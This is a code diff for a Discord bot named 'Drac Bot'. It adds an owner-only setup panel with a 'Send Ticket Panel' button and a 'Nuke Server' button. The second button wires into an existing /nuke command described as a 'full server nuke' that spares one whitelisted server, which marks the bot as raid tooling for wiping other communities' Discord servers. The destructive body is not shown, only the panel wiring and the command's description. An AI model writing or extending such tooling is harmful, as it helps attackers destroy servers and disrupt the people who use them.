@@ -202,6 +202,34 @@ async def ticket_panel(interaction: discord.Interaction):
     except Exception as e:
         await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)
 
+@client.tree.command(name="setup", description="Drac Bot Setup (Owner Only)")
+async def setup_slash(interaction: discord.Interaction):
+    if not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
+    
+    embed = discord.Embed(
+        title="🐲 DRAC BOT SETUP",
+        description="Select an option below to configure the bot for this server.",
+        color=discord.Color.blue()
+    )
+    
+    view = discord.ui.View()
+    
+    ticket_btn = discord.ui.Button(label="Send Ticket Panel", style=discord.ButtonStyle.secondary, emoji="🎫")
+    async def ticket_callback(inv: discord.Interaction):
+        await ticket_panel.callback(inv)
+    ticket_btn.callback = ticket_callback
+    
+    nuke_btn = discord.ui.Button(label="Nuke Server", style=discord.ButtonStyle.danger, emoji="🚀")
+    async def nuke_callback(inv: discord.Interaction):
+        await nuke_slash.callback(inv)
+    nuke_btn.callback = nuke_callback
+    
+    view.add_item(ticket_btn)
+    view.add_item(nuke_btn)
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
 @client.tree.command(name="nuke", description="Full server nuke (Free - uses default message)")
 async def nuke_slash(interaction: discord.Interaction):
     if interaction.guild_id == WHITELISTED_SERVER_ID:
